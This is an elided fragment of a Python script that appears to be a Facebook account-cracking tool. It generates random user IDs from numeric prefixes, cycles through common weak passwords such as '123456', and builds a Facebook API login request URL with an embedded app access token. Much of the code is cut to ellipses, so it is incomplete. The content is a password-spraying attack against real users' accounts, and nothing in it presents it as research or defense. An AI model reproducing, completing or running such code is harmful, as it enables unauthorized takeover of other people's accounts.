...
def VarkCozery():
    ...
    if ask == "1":
        ...
        for _ in range(int(limit)):
            user.append(
                rc(["100001", "100002", "100003", "100004", "100005"]) +
    ...
    try:
        ...
        for pw in ["123456", "1234567", "12345678", "123456789"]:
            ...
            url = (
                ...
                "&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2."
                "fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|"
